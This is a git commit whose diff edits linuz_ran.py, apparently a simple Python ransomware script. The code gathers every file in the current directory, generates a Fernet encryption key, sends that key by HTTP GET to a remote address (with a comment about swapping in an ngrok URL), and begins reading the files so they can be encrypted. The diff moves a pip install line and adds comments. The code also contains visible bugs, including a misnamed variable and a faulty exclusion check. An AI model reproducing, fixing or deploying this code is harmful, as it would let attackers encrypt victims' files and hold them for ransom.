30a689c6fe8385d1d21e391d49f1aef517defbe2
voilater <jayajacob1980@gmail.com>
2022-06-26 07:01:08 +0530

    ran modify

--- linuz_ran.py
+++ linuz_ran.py
@@ -1,24 +1,28 @@
 #! /bin/env python3
 
 import os
+
+os.system("pip3 install requests cryptography")
+
 import requests
 from cryptography.fernet import Fernet
 
 encrypted_files = []
 
-os.system("pip3 install requests cryptography")
-
+#change the file names
 for file in os.listdir():
     if file == "c_note.txt" and "docker_note.txt":
         continue
     encrypted_files.append(file)
 
+#generating a key
 encrypt_key = Fernet.generate_key()
 
-url = "http://192.168.43.121/"
+#change the url(ngrok)
+url = "http://192.168.0.1/"
 send_key = requests.get(url,encrypt_key)
 
-
+#read the file and encode it
 for encode in encrypted_file:
     with open(encode, 'rb') as read_file:
         encoded = read_file.read()
